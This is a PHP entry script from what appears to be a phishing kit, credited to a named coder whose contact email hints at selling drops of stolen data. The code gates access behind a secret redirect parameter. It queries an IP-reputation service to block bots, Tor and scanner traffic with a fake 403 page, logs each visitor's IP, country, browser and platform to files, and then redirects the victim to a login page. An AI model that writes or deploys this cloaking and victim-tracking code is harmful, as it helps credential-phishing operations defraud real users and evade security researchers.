<?php
session_start();
error_reporting(0);
include'config.php';
include'robots.php';
include'function.php';
/*
Coded By Dsox DZ 
Contact ME

Telegram : @dsoxcoder
Icq : @dsoxcoder
Email : inboxmeyourdrop@outlook.com

*/

if ($redirect == "yes") {
    $password = $redirect_password;
  if(!isset($_GET[$password])) {
   $spoxy = fopen("blocked.txt","a+");
    fwrite($spoxy,"".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".date("h:i:sa")." | Wrong Redirect\n");
    fclose($spoxy);
			die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
			exit();
  }
}

if ($antibot == "yes") {
			$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://api.iptrooper.net/check/".$ip_spox."?full=1");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		$set = json_decode($json, true);
		if ($set['type'] == "proxy") {
		//	header('HTTP/1.0 403 Forbidden');
		//	die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
		//	exit();
		}
		if ($set['type'] == "junk") {
			header('HTTP/1.0 403 Forbidden');
			die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
			exit();
		}
		if ($set['type'] == "bot") {
			header('HTTP/1.0 403 Forbidden');
			die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
			exit();
		}
		if ($set['type'] == "tor") {
			header('HTTP/1.0 403 Forbidden');
			die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
			exit();
		}
}
    $spoxy = fopen("visitor.txt","a+");
    fwrite($spoxy,"".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".date("h:i:sa")."\n");
    fclose($spoxy);
	$_SESSION['spox'] = "spoxishere";
	exit(header("Location: login.php?ned_id=".$rundomizi."&country=".$country_spox."&iso=".$country_code_spox."&expired=".$expired.""));
 